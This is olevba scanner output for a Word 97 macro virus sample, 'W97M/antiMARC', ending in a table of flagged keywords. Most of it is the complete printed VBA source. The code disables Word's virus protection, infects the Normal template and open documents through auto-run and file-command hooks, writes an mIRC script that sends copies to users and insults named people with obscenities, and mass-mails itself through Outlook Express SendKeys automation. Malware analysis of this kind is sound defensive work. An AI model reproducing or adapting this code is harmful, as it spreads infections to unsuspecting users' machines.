olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antimarc-41ede7c873308d94e7918ee2c262951c548485be
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antimarc-41ede7c873308d94e7918ee2c262951c548485be - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO antiMARC.bas 
in file: Virus.MSWord.Antimarc-41ede7c873308d94e7918ee2c262951c548485be - OLE stream: 'Macros/VBA/antiMARC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub antiMARC()
'W97M/antiMARC by Lord Natas [Codebreakers 98]
'with special thanks to Rhape79
'"We're just the toys in the hands of another"
On Error Resume Next
Application.EnableCancelKey = 0
Application.DisplayAlerts = 0
WordBasic.DisableAutoMacros = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.SavePropertiesPrompt = 0
Options.ConfirmConversions = 0
WinDir = Environ("WINDIR") & "\"
Application.VBE.ActiveVBProject.VBComponents("antiMARC").Export WinDir & "system\microsof.386"
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "antiMARC" Then a = -1
Next i
For J = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(J).Name = "antiMARC" Then b = -1
Next J
If a = 0 Then
NormalTemplate.VBProject.VBComponents.Import WinDir & "system\microsof.386"
NormalTemplate.Save
End If
If b = 0 Then
ActiveDocument.VBProject.VBComponents.Import WinDir & "system\microsof.386"
If Left(ActiveDocument.Name, 8) <> "Document" And Left(ActiveDocument.Name, 8) <> "Template" Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
End If
Randomize
If Int(Rnd() * 1024) = 666 Then Call mIRCDropper
If Int(Rnd() * 1024) = 666 + 6 Then Call OE
End Sub
Private Sub mIRCDropper()
On Error Resume Next
If Dir("C:\mirc\mirc32.exe") = "" Then GoTo NomIRC
m = System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve")
If m <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
m = System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "Warning")
If m <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "Warning") = "Off"
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:CONNECT: {"
Print #1, "n1=/msg marc FuCk YoU FaScIsT"
Print #1, "n2=/msg warblade STILL SUCKING MARC's COCK?? eh, sure you do!!"
Print #1, "n3=/msg super Hey M0therfux0r, shove X/W up yer fat pimple-covered ass!"
Print #1, "n4=/msg super 'We do not support the distribution of virii' - i guess you do now, bitch!"
Print #1, "n5=/msg #gotinfected777 Kick Me! - I'm InFeCtEd!"
Print #1, "n6=}"
Print #1, "n7=on 1:JOIN:#: if ( $me != $nick) { /dcc send $nick c:\windows\xxxpasswords.doc }"
Print #1, "n8=on 1:TEXT:*marcsux*:#: {"
Print #1, "n9=/ctcp $nick X"
Print #1, "n10=/msg #gotinfected777 X"
Print #1, "n11=}"
Print #1, "n12=on 1:TEXT:marcisalamer*:?:{ s *2 | halt }"
Print #1, "n13=alias /s / *1"
Close #1
ActiveDocument.Save
ActiveDocument.SaveAs FileName:="c:\windows\xxxpasswords.doc", AddToRecentFiles:=False
Application.Quit SaveChanges:=wdDoNotSaveChanges
NomIRC:
End Sub
Private Sub OE()
On Error Resume Next
For i = 1 To 8
Randomize
Temp = Temp + Chr$(Int(Rnd() * (90 - 65) + 65))
Next
sName = "C:\" + Temp + ".DOC"
ActiveDocument.SaveAs FileName:=sName
For Each myTask In Tasks
If InStr(myTask.Name, "Address Book") > 0 Then
myTask.Activate (0)
Call Delay
GoTo NextShit
End If
Next myTask
oeFile = "C:\Program Files\Outlook Express\wab.exe"
If Dir(oeFile) <> "" Then
Shell oeFile, 4
GoTo NextShit
End If
GoTo NoOE
NextShit:
t = "Address Book - (C:\WINDOWS\Application Data\Microsoft\Address Book\UserMPS.wab)"
loop1:
If Tasks.Exists(t) = False Then GoTo loop1
Call Delay
SendKeys "{TAB}", -1
SendKeys "+({DOWN 20})", -1
SendKeys "%T", -1
SendKeys "M", -1
loop2:
If Tasks.Exists("New Message") = False Then GoTo loop2
Call Delay
SendKeys "{TAB}", -1
SendKeys "{TAB}", -1
SendKeys "{TAB}", -1
Randomize
For i = 1 To Int(Rnd() * (35 - 1) + 1)
If Rnd() < Rnd() Then
R = R + Chr$(Int(Rnd() * (122 - 97) + 97))
Else
R = R + Chr$(Int(Rnd() * (90 - 65) + 65))
End If
Next
SendKeys R, -1
Call Delay
SendKeys "%I", -1
SendKeys "A", -1
SendKeys sName, -1
SendKeys "{ENTER}", -1
SendKeys "{TAB}", -1
SendKeys "J97Z/nagvZNEP ol Ybeq Angnf [Pbqroernxref 98]", -1
SendKeys "%S", -1
NoOE:
End Sub
Private Sub Delay()
For i = 1 To 666
For J = 1 To 666 * 2.5
Next J
Next i
End Sub
Sub AutoClose()
On Error Resume Next
Call antiMARC
End Sub
Sub AutoExec()
End Sub
Sub AutoOpen()
On Error Resume Next
Call antiMARC
End Sub
Sub FileClose()
On Error Resume Next
Call antiMARC
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
Call antiMARC
End Sub
Sub FileSave()
On Error Resume Next
Call antiMARC
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call antiMARC
End Sub
Sub ToolsMacro()
On Error Resume Next
Call antiMARC
End Sub
Sub FileTemplates()
On Error Resume Next
Call antiMARC
End Sub
Sub ViewVBCode()
On Error Resume Next
Call antiMARC
End Sub
Sub FormatStyle()
On Error Resume Next
Call antiMARC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |wab.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

